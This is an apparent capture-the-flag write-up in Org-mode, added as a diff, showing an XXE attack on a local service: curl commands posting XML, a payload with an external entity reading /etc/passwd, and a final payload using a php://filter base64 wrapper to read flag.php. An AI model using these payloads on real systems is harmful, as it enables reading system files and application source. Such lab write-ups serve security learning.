@@ -1,0 +1,33 @@
+#+TITLE: Writeup
+
+* PoC
+
+#+BEGIN_SRC shell
+curl -X POST -d "<xml></xml>" http://localhost:10013
+#+END_SRC
+
+* XXE - Attempt 1
+
+#+BEGIN_SRC xml
+<?xml version="1.0"?>
+<!DOCTYPE root [<!ENTITY test SYSTEM '/etc/passwd'>]>
+<root>
+&test;
+</root>
+#+END_SRC
+
+#+BEGIN_SRC shell
+curl -X POST --data-binary "@payload.xml" http://localhost:10013
+#+END_SRC
+
+* Final XXE
+
+#+BEGIN_SRC xml
+<?xml version="1.0"?>
+<!DOCTYPE root [
+  <!ENTITY test SYSTEM 'php://filter/convert.base64-encode/resource=flag.php'>
+]>
+<root>
+&test;
+</root>
+#+END_SRC
